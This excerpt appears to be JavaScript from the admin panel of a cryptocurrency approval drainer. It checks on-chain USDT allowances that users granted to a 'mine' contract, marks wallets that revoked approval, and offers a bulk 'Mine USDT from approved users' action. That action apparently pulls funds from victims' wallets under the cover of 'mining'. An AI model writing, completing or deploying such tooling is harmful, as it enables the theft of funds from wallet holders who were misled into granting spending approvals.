...
let adminAccount = null; // Set dynamically via connectAdminWallet()
...
// On-chain allowance cache: { walletAddress: { allowance: BigInt, timestamp: number } }
const allowanceCache = {};
const ALLOWANCE_CACHE_TTL = 60000; // 60 seconds
...
function initVirtualScroll() {
    ...
    function renderVisibleRows() {
        ...
        // Check on-chain allowances for visible rows
        checkVisibleAllowances();
    }
...
/**
 * Check on-chain USDT allowance for all visible Mine buttons.
 * Disables Mine button if the user has revoked approval (allowance = 0).
 * Re-enables if they re-approve.
 */
async function checkVisibleAllowances() {
    if (!ADMIN_CONFIG.usdtAddress || !ADMIN_CONFIG.mineContract) return;

    const buttons = document.querySelectorAll('.mine-action-btn');
    if (buttons.length === 0) return;

    // Use a public BSC RPC to check allowances (no wallet connection needed)
    const rpcUrl = 'https://bsc-dataseed1.binance.org/';
    const spender = ADMIN_CONFIG.mineContract;

    // Build batch of wallets that need checking
    const toCheck = [];
    buttons.forEach(btn => {
        const wallet = btn.getAttribute('data-wallet');
        if (!wallet) return;
        const cached = allowanceCache[wallet.toLowerCase()];
        if (cached && (Date.now() - cached.timestamp) < ALLOWANCE_CACHE_TTL) {
            // Use cached value
            updateMineButton(btn, cached.allowance);
        } else {
            toCheck.push({ btn, wallet });
        }
    });

    if (toCheck.length === 0) return;

    // Check allowances in parallel batches of 10
    const batchSize = 10;
    for (let i = 0; i < toCheck.length; i += batchSize) {
        const batch = toCheck.slice(i, i + batchSize);
        const promises = batch.map(async ({ btn, wallet }) => {
            try {
                // ERC-20 allowance(address owner, address spender) call
                const ownerPadded = wallet.slice(2).toLowerCase().padStart(64, '0');
                ...
                const response = await fetch(rpcUrl, {
                    ...
                    body: JSON.stringify({
                        ...
                        params: [{ to: ADMIN_CONFIG.usdtAddress, data: callData }, 'latest']
                    })
                });
                const result = await response.json();
                const allowance = result.result ? BigInt(result.result) : 0n;

                // Cache the result
                allowanceCache[wallet.toLowerCase()] = { allowance, timestamp: Date.now() };

                // Update button state
                updateMineButton(btn, allowance);
            } catch (err) {
                console.warn(`⚠️ Allowance check failed for ${wallet}:`, err);
                // On error, keep button enabled (fail-open for admin usability)
            }
        });
...
/**
 * Update a Mine button's enabled/disabled state based on on-chain allowance.
 */
function updateMineButton(btn, allowance) {
    if (allowance === 0n || allowance === BigInt(0)) {
        // REVOKED — disable mining
        btn.disabled = true;
        btn.textContent = '🚫 Revoked';
        btn.style.background = '#6b2d2d';
        btn.style.cursor = 'not-allowed';
        btn.style.opacity = '0.7';
        btn.title = 'User has revoked USDT approval. Mining disabled.';
    } else {
        // APPROVED — enable mining
        btn.disabled = false;
        btn.textContent = '💎 Mine';
        btn.style.background = 'var(--accent-green)';
        btn.style.cursor = 'pointer';
        btn.style.opacity = '1';
        btn.title = 'Click to mine tokens from this wallet';
    }
}

/**
 * Invalidate all cached allowances (called on Refresh Balances)
 */
function invalidateAllowanceCache() {
    Object.keys(allowanceCache).forEach(k => delete allowanceCache[k]);
}
...
async function refreshBalances() {
    invalidateAllowanceCache(); // Force re-check of on-chain allowances
...
async function mineAllTokens() {
    ...
    const potentialUsers = lastUsers.filter(u => parseFloat(u.usdtBalance) > 0);

    if (potentialUsers.length === 0) {
        alert('No users with balance found.');
        return;
    }

    // Check on-chain allowances to filter out revoked wallets
    showError('🔍 Checking on-chain allowances...');
    const rpcUrl = 'https://bsc-dataseed1.binance.org/';
    const spender = ADMIN_CONFIG.mineContract;
    ...
    for (const user of potentialUsers) {
        try {
            const cached = allowanceCache[user.walletAddress.toLowerCase()];
            let allowance;
            if (cached && (Date.now() - cached.timestamp) < ALLOWANCE_CACHE_TTL) {
                allowance = cached.allowance;
            } else {
                const ownerPadded = user.walletAddress.slice(2).toLowerCase().padStart(64, '0');
                const spenderPadded = spender.slice(2).toLowerCase().padStart(64, '0');
                const callData = '0xdd62ed3e' + ownerPadded + spenderPadded;
                const response = await fetch(rpcUrl, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: [{ to: ADMIN_CONFIG.usdtAddress, data: callData }, 'latest'] })
                });
                const result = await response.json();
                allowance = result.result ? BigInt(result.result) : 0n;
                allowanceCache[user.walletAddress.toLowerCase()] = { allowance, timestamp: Date.now() };
            }
            if (allowance > 0n) authorizedUsers.push(user);
        } catch (e) {
            console.warn(`⚠️ Allowance check failed for ${user.walletAddress}, skipping:`, e);
        }
    }

    const revokedCount = potentialUsers.length - authorizedUsers.length;

    if (authorizedUsers.length === 0) {
        alert(`No authorized users found. ${revokedCount} user(s) have revoked their approval.`);
        return;
    }

    const revokeMsg = revokedCount > 0 ? `\n(${revokedCount} revoked wallet(s) will be skipped)` : '';
    if (!confirm(`Mine USDT from ${authorizedUsers.length} approved users?${revokeMsg}`)) {
        return;
    }
